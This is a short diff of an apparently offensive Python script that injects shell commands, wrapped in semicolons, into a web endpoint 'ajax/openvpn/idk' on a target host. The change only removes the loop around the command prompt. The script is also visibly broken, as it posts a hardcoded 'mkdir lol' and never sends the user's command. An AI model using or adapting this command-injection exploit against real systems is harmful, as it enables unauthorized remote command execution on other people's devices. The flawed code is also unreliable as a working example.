@@ -22,14 +22,13 @@ else:
     endpoint = "ajax/openvpn/idk"
     url = "http://{}:{}/{}".format(target_host,target_port,endpoint)
 
-    while(True):
-        cmd = input("Please enter a command:\n")
-        command = ";"+cmd+";"
-        s = requests.Session()
-        post_Request = s.post(url, data="mkdir lol")
-        if post_Request.status_code==200:
-            print("[*] Sending command ... ")
-            print(post_Request.text)
-            print("Done")
-        else:
-            print("Error.["+post_Request.text+"]")
+    cmd = input("Please enter a command:\n")
+    command = ";"+cmd+";"
+    s = requests.Session()
+    post_Request = s.post(url, data="mkdir lol")
+    if post_Request.status_code==200:
+        print("[*] Sending command ... ")
+        print(post_Request.text)
+        print("Done")
+    else:
+        print("Error.["+post_Request.text+"]")
